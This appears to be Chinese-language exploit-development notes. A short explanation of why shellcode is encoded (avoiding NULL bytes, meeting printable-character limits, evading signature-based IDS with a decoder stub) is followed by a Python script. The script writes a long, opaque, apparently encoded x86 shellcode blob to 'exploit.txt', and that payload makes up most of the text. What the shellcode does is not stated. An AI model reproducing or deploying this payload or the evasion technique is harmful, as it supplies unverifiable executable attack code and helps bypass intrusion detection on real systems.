### shellcode编码
>为什么要对 shellcode 编码？ 在很多漏洞利用场景中，shellcode 的内容将会受到限制：
首先，所有的字符串函数都会对 NULL 字节进行限制。通常我们需要选择特殊的指令来避免在 shellcode 中直接出现 NULL 字节（byte，ASCII 函数）或字（word，Unicode 函数）；
其次，有些函数还会要求 shellcode 必须为可见字符的 ASCII 值或 Unicode 值。在这种限制 较多的情况下，如果仍然通过挑选指令的办法控制 shellcode 的值的话，将会给开发带来很大困 难。毕竟用汇编语言写程序就已经不那么容易了；
最后，除了以上提到的软件自身的限制之外，在进行网络攻击时，基于特征的 IDS 系统往往也会对常见的 shellcode 进行拦截。
那么如何绕过以上限制呢？
我们可以先专心完成 shellcode 的逻辑，然后使用编码技术对 shellcode 进行编码，使其内容达到限制的要求，最后再精心构造十几个字节的解码程序，放在 shellcode 开始执行的地方。
当 exploit 成功时，shellcode 顶端的解码程序首先运行，它会在内存中将真正的 shellcode 还原成原来的样子，然后执行之。这种对 shellcode 编码的方法和软件加壳的原理非常类似。

### Python write shellcode into file
```
#!/usr/bin/python3
shellcode =  b""
shellcode += b"\xbf\x6d\x62\xb2\xc2\xdb\xd7\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x52\x83\xc6\x04\x31\x7e\x0e"
shellcode += b"\x03\x13\x6c\x50\x37\x17\x98\x16\xb8\xe7\x59"
shellcode += b"\x77\x30\x02\x68\xb7\x26\x47\xdb\x07\x2c\x05"
shellcode += b"\xd0\xec\x60\xbd\x63\x80\xac\xb2\xc4\x2f\x8b"
shellcode += b"\xfd\xd5\x1c\xef\x9c\x55\x5f\x3c\x7e\x67\x90"
shellcode += b"\x31\x7f\xa0\xcd\xb8\x2d\x79\x99\x6f\xc1\x0e"
shellcode += b"\xd7\xb3\x6a\x5c\xf9\xb3\x8f\x15\xf8\x92\x1e"
shellcode += b"\x2d\xa3\x34\xa1\xe2\xdf\x7c\xb9\xe7\xda\x37"
shellcode += b"\x32\xd3\x91\xc9\x92\x2d\x59\x65\xdb\x81\xa8"
shellcode += b"\x77\x1c\x25\x53\x02\x54\x55\xee\x15\xa3\x27"
shellcode += b"\x34\x93\x37\x8f\xbf\x03\x93\x31\x13\xd5\x50"
shellcode += b"\x3d\xd8\x91\x3e\x22\xdf\x76\x35\x5e\x54\x79"
shellcode += b"\x99\xd6\x2e\x5e\x3d\xb2\xf5\xff\x64\x1e\x5b"
shellcode += b"\xff\x76\xc1\x04\xa5\xfd\xec\x51\xd4\x5c\x79"
shellcode += b"\x95\xd5\x5e\x79\xb1\x6e\x2d\x4b\x1e\xc5\xb9"
shellcode += b"\xe7\xd7\xc3\x3e\x07\xc2\xb4\xd0\xf6\xed\xc4"
shellcode += b"\xf9\x3c\xb9\x94\x91\x95\xc2\x7e\x61\x19\x17"
shellcode += b"\xd0\x31\xb5\xc8\x91\xe1\x75\xb9\x79\xeb\x79"
shellcode += b"\xe6\x9a\x14\x50\x8f\x31\xef\x33\x70\x6d\x98"
shellcode += b"\x7d\x18\x6c\x66\x83\x62\xf9\x80\xe9\x84\xac"
shellcode += b"\x1b\x86\x3d\xf5\xd7\x37\xc1\x23\x92\x78\x49"
shellcode += b"\xc0\x63\x36\xba\xad\x77\xaf\x4a\xf8\x25\x66"
shellcode += b"\x54\xd6\x41\xe4\xc7\xbd\x91\x63\xf4\x69\xc6"
shellcode += b"\x24\xca\x63\x82\xd8\x75\xda\xb0\x20\xe3\x25"
shellcode += b"\x70\xff\xd0\xa8\x79\x72\x6c\x8f\x69\x4a\x6d"
shellcode += b"\x8b\xdd\x02\x38\x45\x8b\xe4\x92\x27\x65\xbf"
shellcode += b"\x49\xee\xe1\x46\xa2\x31\x77\x47\xef\xc7\x97"
shellcode += b"\xf6\x46\x9e\xa8\x37\x0f\x16\xd1\x25\xaf\xd9"
shellcode += b"\x08\xee\xdf\x93\x10\x47\x48\x7a\xc1\xd5\x15"
shellcode += b"\x7d\x3c\x19\x20\xfe\xb4\xe2\xd7\x1e\xbd\xe7"
shellcode += b"\x9c\x98\x2e\x9a\x8d\x4c\x50\x09\xad\x44"
f = open("exploit.txt","wb")
f.write(shellcode)
f.close()
```
